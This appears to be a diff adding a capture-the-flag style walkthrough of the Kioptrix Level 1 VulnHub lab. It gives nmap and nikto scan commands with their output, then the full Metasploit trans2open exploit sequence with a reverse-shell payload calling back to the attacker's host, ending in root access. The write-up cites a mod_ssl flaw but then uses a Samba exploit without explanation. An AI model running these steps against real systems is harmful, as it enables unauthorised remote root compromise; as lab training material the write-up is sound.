@@ -1,0 +1,37 @@
+Kioptrix Level 1 VM is a beginner hack the box image on VulnHub.
+
+1) Checking the arp table on my host, I can see that the VM has been assigned a DHCP address of: 10.10.10.11
+2) Let's get some information on the target with nmap: nmap -sS -p- -T 4 -A 10.10.10.11 -vv
+
+My notes from this scan now show:
+
+Discovered open port 443/tcp on 10.10.10.11
+Discovered open port 80/tcp on 10.10.10.11
+Discovered open port 139/tcp on 10.10.10.11
+Discovered open port 111/tcp on 10.10.10.11
+Discovered open port 22/tcp on 10.10.10.11
+22/tcp    open  ssh   OpenSSH 2.9p2 (protocol 1.99)
+80/tcp    http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+139/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd (workgroup: MYGROUP)
+443/tcp   open  ssl/https   syn-ack ttl 64 Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+
+3) Generally when I see web services open, I always take a look. I couldn't find any cookies worth mentioning and the client-side code had nothing interesting. That the webpage is showing a default Apache page is a finding in itself.
+4) Next onto nikto: nikto -h http://10.10.10.11/
+
+While there was a lot that was of interest, this line stood out:
+
++ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.
+
+A quick bit of research reveals that this buffer overflow exploits a flaw on x86 Linux systems that do not have the noexec stack option set.
+5) Onto Metasploit:
+
+msfconsole
+search trans2open
+use exploit/linux/samba/trans2open
+options
+set RHOST 10.10.10.11
+set payload linux/x86/shell_reverse_tcp
+set lhost 10.10.10.10
+exploit
+
+I had to try runnign exploit several times - I'm not sure why it seemed to get stuck in trying dozens of return addresses. Either way, this worked and provided a reverse shell! Running uname -a shows the kioptrix.level1 name. whoami shows root.
